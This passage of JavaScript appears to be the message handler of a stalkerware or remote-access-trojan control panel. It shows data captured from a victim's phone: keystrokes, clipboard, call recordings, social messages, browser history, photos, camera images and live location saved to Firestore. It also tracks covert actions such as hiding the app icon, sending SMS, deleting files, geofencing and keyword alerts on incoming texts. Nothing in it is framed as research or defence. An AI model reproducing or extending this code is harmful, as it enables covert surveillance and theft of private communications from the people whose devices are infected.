        else if(j.type==='INSTALLED_APPS'){ displayInstalledApps(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='BROWSER_HISTORY_DATA'){ displayBrowserHistory(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='WIFI_NETWORKS_DATA'){ displayWifiNetworks(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='APP_USAGE_DATA'){ displayAppUsage(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='SOCIAL_MESSAGES_DATA'){ displaySocialMessages(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='KEYLOG_DATA'){ displayKeylog(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='CLIPBOARD_DATA'){ displayClipboard(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='CALL_RECORDINGS_DATA'){ displayCallRecordings(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='CALL_AUDIO_DATA'){ const ca=typeof j.data==='string'?JSON.parse(j.data):j.data; if(ca&&ca.audio) playCallRecording(ca); }
        else if(j.type==='RECENT_IMAGES_DATA'){ displayPhotoGallery(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='APP_EVENTS_DATA'){ displayAppEvents(typeof j.data==='string'?JSON.parse(j.data):j.data); }
        else if(j.type==='CAMERA_IMAGE'){ displayCapturedImage(j.data); }
        else if(j.type==='LOCATION_UPDATE'){ const loc=typeof j.data==='string'?JSON.parse(j.data):j.data; if(loc&&loc.lat){ currentLocation=loc; storeLocationToFirestore(loc.lat,loc.lon,loc.accuracy||10); renderMap(loc); } }
        else if(j.type==='FLASH_ON'){ flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('Flash ON'); }
        else if(j.type==='FLASH_OFF'){ flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('Flash OFF'); }
        else if(j.type==='APP_HIDDEN'){ iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; }
        else if(j.type==='APP_SHOWN'){ iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; }
        else if(j.type==='GEOFENCE_ALERT'){ pushAlert('Geofence',j.event==='EXIT'?'🚨 Left zone':'✅ Entered zone'); }
        else if(j.type==='DEVICE_LOCKED'){ showNotification('Screen locked'); }
        else if(j.type==='SMS_SENT'){ showNotification('SMS sent'); }
        else if(j.type==='FILE_DELETED'){ showNotification('File deleted'); }
        else if(j.type==='VIBRATE_COMPLETE'){ showNotification('Vibrated'); }
        else if(j.type==='GPS_UPDATES_STOPPED'){ liveGpsActive=false; showNotification('GPS stopped'); }
        else if(j.type==='NOTIFICATION_LIVE'){ pushAlert(j.app||'App',(j.title||'')+': '+(j.text||'')); }
        else if(j.type==='CALL_ALERT'){ if(j.event==='RINGING') pushAlert('Incoming Call',j.name||j.number); else if(j.event==='MISSED') pushAlert('Missed Call',j.name||j.number); }
        else if(j.type==='SMS_KEYWORD_ALERT'){ pushAlert('Keyword: '+j.keyword,'From '+j.from+': '+j.body); }
        else console.log('Unhandled',j.type);
    }catch(e){ console.log('Plain text',msg); }
}
